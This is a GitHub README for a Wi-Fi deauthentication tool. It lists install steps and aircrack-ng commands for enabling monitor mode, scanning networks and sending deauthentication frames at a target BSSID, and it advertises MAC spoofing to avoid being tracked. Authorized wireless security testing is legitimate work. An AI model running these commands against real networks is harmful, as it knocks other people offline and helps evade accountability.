# Deauth Tool

A comprehensive Wi-Fi deauthentication tool for security testing and educational purposes.

---
<img width="1600" height="647" alt="image" src="https://github.com/user-attachments/assets/4728147f-5dc0-42f7-aede-45f1bc3af2dc" />

---
## 🚨 Disclaimer

This tool is intended for **educational purposes and authorized security testing only**. 
Users must have explicit permission to test networks they do not own. 
The authors are not responsible for any misuse or illegal activities.

## 📋 Requirements

- Debian based linux distros operating system (Ubuntu, Kali Linux, Parrot OS, etc.)
- Wireless network adapter supporting monitor mode
- Root/sudo privileges

## 🛠️ Installation

### Step 0: Clone the Repository

```bash
git clone https://github.com/RMNO21/Deauther.git
cd Deauther
```
### install requirements

```bash
# Make the installation script executable
chmod +x requirements.sh

# Run the installation script
sudo ./requirements.sh
```

### Then, Verify Installation

```bash
# Check if required tools are installed
which airmon-ng
which airodump-ng
which aireplay-ng
which macchanger
which xterm
```

## 📖 Usage

### Basic Usage

```bash
# Make the main script executable
chmod +x deauth_all.sh

# Run the tool with sudo
sudo ./deauth_all.sh
```

### Manual Network Testing

1. **Enable Monitor Mode:**
   ```bash
   sudo airmon-ng start wlan0
   ```

2. **Scan for Networks:**
   ```bash
   sudo airodump-ng wlan0mon
   ```

3. **Targeted Deauthentication:**
   ```bash
   sudo aireplay-ng -0 5 -a [BSSID] wlan0mon
   ```

### Script Options

The `deauth_all.sh` script provides:
- Automatic network scanning
- Target selection interface
- Configurable deauthentication packets
- Real-time monitoring

## 🔧 Configuration

Edit the script variables to customize:
- Packet count
- Delay between packets
- Target filtering options
- Output logging

## 📚 Features

- **Network Discovery**: Automatic scanning of nearby Wi-Fi networks
- **Target Selection**: Interactive interface for choosing targets
- **Configurable Attacks**: Adjustable packet count and timing
- **Monitor Mode Support**: Automatic setup and cleanup
- **Logging**: Detailed activity logs
- **Mac address spoofing**: Spoof interface mac address to avoid being tracked

## 🛡️ Safety Notes

- Only test on networks you own or have permission to test
- Use in controlled environments
- Be aware of local regulations regarding Wi-Fi testing
- Do not use on public or commercial networks without authorization

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## 📝 License

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.

## ⚠️ Legal Notice

Users are responsible for ensuring compliance with local laws and regulations.
I assume no liability for misuse or illegal activities.
Raman Tondro

## ⁉️ Issues

For issues and questions:
- Check the installation requirements
- Verify your wireless adapter supports monitor mode
- Ensure proper permissions are set

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.
